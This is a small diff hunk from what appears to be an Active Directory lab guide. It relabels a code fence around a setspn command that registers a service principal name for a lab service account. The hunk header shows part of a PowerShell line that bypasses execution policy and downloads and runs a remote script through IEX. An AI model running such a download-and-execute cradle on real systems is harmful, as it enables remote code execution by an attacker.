@@ -27,7 +27,7 @@ powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('
 
 Create an SPN:
 
-```cmd
+```bash
 setspn -s HTTP/iis.mylab.local mylab\svc_iis
 ```
 
